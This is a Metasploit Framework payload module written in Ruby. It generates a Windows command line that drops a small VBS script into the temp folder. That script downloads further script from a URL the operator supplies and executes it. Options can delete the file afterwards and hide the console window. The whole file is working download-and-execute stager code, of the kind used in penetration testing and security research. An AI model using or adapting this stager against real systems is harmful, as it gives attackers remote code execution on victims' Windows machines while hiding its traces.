##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows Executable Download and Evaluate VBS',
        'Description' => %q{
          Downloads a file from an HTTP(S) URL and executes it as a vbs script.
          Use it to stage a vbs encoded payload from a short command line.
        },
        'Author' => 'scriptjunkie',
        'License' => BSD_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::None,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'wscript',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )

    register_options(
      [
        OptString.new('URL', [ true, 'The pre-encoded URL to the script' ]),
        OptBool.new('INCLUDECMD', [ true, 'Include the cmd /q /c', false ]),
        OptBool.new('INCLUDEWSCRIPT', [ true, 'Include the wscript command', false ]),
        OptBool.new('DELETE', [ true, 'Delete created .vbs after download', false ])
      ]
    )
  end

  def generate(_opts = {})
    return super + command_string
  end

  def command_string
    # Keep variable names short.
    vbsname = Rex::Text.rand_text_alpha(1..2)
    xmlhttpvar = Rex::Text.rand_text_alpha(1..2)

    command = ''
    command << 'cmd.exe /q /c ' if datastore['INCLUDECMD']
    command << "cd %tmp%&echo Set #{xmlhttpvar}=CreateObject(\"Microsoft.XMLHTTP\"):" \
               "#{xmlhttpvar}.Open \"GET\",\"#{datastore['URL']}\",False:" \
               "#{xmlhttpvar}.Send:" \
               "Execute #{xmlhttpvar}.responseText"
    command << ":CreateObject(\"Scripting.FileSystemObject\").DeleteFile \"#{vbsname}.vbs\"" if datastore['DELETE']

    # "start #{vbsname}.vbs" instead of just "#{vbsname}.vbs" so that the console window
    # disappears quickly before the wscript libraries load and the file downloads
    command << " >#{vbsname}.vbs" \
               '&start '
    command << 'wscript ' if datastore['INCLUDEWSCRIPT']
    command << "#{vbsname}.vbs"
  end
end
